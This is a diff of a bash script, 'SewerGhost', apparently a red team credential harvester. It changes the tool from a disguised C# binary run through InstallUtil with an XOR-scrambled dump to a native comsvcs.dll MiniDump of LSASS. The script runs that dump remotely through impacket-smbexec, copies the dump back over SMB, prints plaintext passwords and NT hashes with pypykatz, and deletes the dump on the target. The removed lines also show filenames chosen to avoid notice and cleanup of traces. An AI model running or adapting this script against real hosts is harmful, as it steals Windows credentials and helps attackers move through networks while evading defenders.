@@ -1,95 +1,91 @@
 #!/bin/bash
 # ==============================================================================
-# SewerGhost - Automated Credential Harvester (InstallUtil Edition)
-# Author: [Your Name/Email] - CDT Bravo Red Team
-# Goal: Stealthy LSASS dump, XOR scramble, and remote cleanup.
+# SewerGhost - Automated Credential Harvester (Native comsvcs.dll Edition)
+# Author: Red Team
+# Goal: Get passwords from LSASS dump via built-in Windows tools
 # ==============================================================================
 
-# --- Argument Mapping ---
 TARGET_IP=$1
 SMB_USER=$2
 SMB_PASS=$3
 
-# Check if all arguments are provided
 if [ -z "$TARGET_IP" ] || [ -z "$SMB_USER" ] || [ -z "$SMB_PASS" ]; then
     echo "Usage: ./run.sh <IP> <User> <Pass>"
     exit 1
 fi
 
-# Discrete Staging Paths
-# We move the EXE to Tasks and the LOOT to the Spooler directory from your screenshot
-LOCAL_CS_FILE="SewerScanner.cs"
-LOCAL_EXE="SewerScanner.exe"
-REMOTE_EXE_PATH="C:\\Windows\\Tasks\\metadata.exe"
-REMOTE_LOOT_PATH="C:\\Windows\\System32\\spool\\drivers\\color\\ExpressColor_v4.dat"
-LOCAL_LOOT_NAME="ExpressColor.dat"
-DECODED_DMP="lsass.dmp"
+DUMP_PATH="C:\\Windows\\Temp\\lsass.dmp"
+LOCAL_DMP="lsass.dmp"
 
-# XOR Key (Must match your C# code)
-XOR_KEY="0xDE 0xAD 0xBE 0xEF"
+echo "[*] --- SewerGhost Credential Harvester ---"
+echo "[*] Target: $TARGET_IP"
+echo ""
 
-echo "[*] --- Starting SewerGhost Operation ---"
-echo "[*] Target: $TARGET_IP | User: $SMB_USER"
-# 1. Compilation
-echo "[*] Phase 1: Compiling C# assembly with InstallUtil references..."
-mcs -out:$LOCAL_EXE $LOCAL_CS_FILE -r:System.Configuration.Install.dll
-if [ $? -ne 0 ]; then
-    echo "[-] Compilation failed! Ensure mono-mcs is installed."
-    exit 1
-fi
-
-# 2. Upload/Staging
-echo "[*] Phase 2: Staging binary to $REMOTE_EXE_PATH..."
-impacket-smbclient "$SMB_USER":"$SMB_PASS"@$TARGET_IP <<EOT
-cd C:\Windows\Tasks
-put $LOCAL_EXE metadata.exe
-exit
-EOT
-
-# 3. Execution
-echo "[*] Phase 3: Triggering dump via InstallUtil (Uninstall Mode)..."
-# Using smbexec to run the command silently in the background
-# Note: /U flag tells InstallUtil to call Uninstall() instead of Install()
-impacket-smbexec "$SMB_USER":"$SMB_PASS"@$TARGET_IP -c "cd C:\\Windows\\Tasks && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U metadata.exe 2>&1"
-
-# Give the dump 5 seconds to complete and scramble
-sleep 5
-
-# 4. Exfiltration & Cleanup
-echo "[*] Phase 4: Grabbing loot and wiping traces..."
-# Give the dump 5 seconds to complete and scramble if not already done
+# Phase 1: Dump LSASS via built-in comsvcs.dll (runs as SYSTEM, no custom exe)
+echo "[*] Phase 1: Dumping LSASS memory..."
+impacket-smbexec "$SMB_USER":"$SMB_PASS"@$TARGET_IP -c "powershell -c \"\\\$pid=(Get-Process lsass).Id; rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump \\\$pid $DUMP_PATH full\"" 2>/dev/null
 sleep 2
 
-# Retrieve the scrambled dump using impacket-smbclient
-echo "[*] Retrieving scrambled LSASS dump..."
-echo "get C:\Windows\System32\spool\drivers\color\ExpressColor_v4.dat $LOCAL_LOOT_NAME" | impacket-smbclient -U "$SMB_USER%$SMB_PASS" "//$TARGET_IP/c\$" 2>/dev/null
-if [ -f "$LOCAL_LOOT_NAME" ]; then
-    echo "[+] Successfully retrieved dump!"
-else
-    echo "[!] Warning: Dump file not found locally. Dump may have failed on target."
-fi
+# Phase 2: Retrieve the dump file
+echo "[*] Phase 2: Retrieving dump from target..."
+echo "get C:\\Windows\\Temp\\lsass.dmp $LOCAL_DMP" | impacket-smbclient -U "$SMB_USER%$SMB_PASS" "//$TARGET_IP/c\$" 2>/dev/null
 
-# Optional cleanup - use smbexec with PowerShell for safer deletion
-# Uncomment to clean up (commented out for forensics preservation)
-# echo "[*] Cleaning up remote artifacts..."
-# impacket-smbexec "$SMB_USER":"$SMB_PASS"@$TARGET_IP -service-name "SysCleanup" powershell.exe "-Command" "Remove-Item -Force -Path 'C:\Windows\System32\spool\drivers\color\ExpressColor_v4.dat'; Remove-Item -Force -Path 'C:\Windows\Tasks\metadata.exe'"
-
-# 5. Decoding
-echo "[*] Phase 5: Descrambling XOR data..."
-if [ -f "$LOCAL_LOOT_NAME" ]; then
-    python3 -c "key=b'\xde\xad\xbe\xef'; d=open('$LOCAL_LOOT_NAME','rb').read(); open('$DECODED_DMP','wb').write(bytes(d[i]^key[i%len(key)] for i in range(len(d))))"
-    if [ -f "$DECODED_DMP" ]; then
-        echo "[+] Successfully descrambled: $DECODED_DMP"
-        echo "[+] File size: $(stat -c%s $DECODED_DMP) bytes"
-    else
-        echo "[-] Descrambling failed!"
-        exit 1
-    fi
-else
-    echo "[-] Cannot descramble - no local copy of $LOCAL_LOOT_NAME"
+if [ ! -f "$LOCAL_DMP" ]; then
+    echo "[-] ERROR: Failed to retrieve dump!"
     exit 1
 fi
 
-echo "[+] Operation Successful."
-echo "[!] Local files: $DECODED_DMP (Ready for pypykatz)"
-echo "[*] --- End of Line ---"
+echo "[+] Retrieved: $LOCAL_DMP ($(stat -c%s $LOCAL_DMP 2>/dev/null || echo '?') bytes)"
+echo ""
+
+# Phase 3: Extract credentials using pypykatz
+echo "[*] Phase 3: Extracting credentials from dump..."
+python3 << 'PYTHON_EOF'
+import sys
+try:
+    from pypykatz.lsass import lsass_dumper
+    
+    print("[*] Parsing LSASS minidump...")
+    mimi = lsass_dumper.parse_minidump_file("lsass.dmp")
+    
+    print("[+] Successfully parsed!")
+    print("\n" + "="*70)
+    print("EXTRACTED CREDENTIALS")
+    print("="*70)
+    
+    found_creds = False
+    for sess_id, logon_sess in mimi.logon_sessions.items():
+        for cred in logon_sess.credentials:
+            if cred.password or cred.nthash:
+                found_creds = True
+                if cred.username:
+                    print(f"\n  Username: {cred.username}")
+                if cred.domain:
+                    print(f"  Domain:   {cred.domain}")
+                if cred.password:
+                    print(f"  Password: {cred.password}")
+                if cred.nthash:
+                    print(f"  NT Hash:  {cred.nthash.hex()}")
+    
+    if not found_creds:
+        print("\n[!] No plaintext passwords found (may need NTLM hashes)")
+        print("[*] Showing all sessions for reference:")
+        for sess_id, logon_sess in mimi.logon_sessions.items():
+            for cred in logon_sess.credentials:
+                if cred.username:
+                    print(f"    - {cred.username} ({cred.domain})")
+    
+    print("\n" + "="*70)
+    
+except Exception as e:
+    print(f"[-] Error: {e}")
+    import traceback
+    traceback.print_exc()
+    sys.exit(1)
+PYTHON_EOF
+
+# Phase 4: Optional cleanup on target
+echo ""
+echo "[*] Phase 4: Cleaning up target..."
+impacket-smbexec "$SMB_USER":"$SMB_PASS"@$TARGET_IP -c "del $DUMP_PATH 2>nul" 2>/dev/null
+echo "[+] Done!"
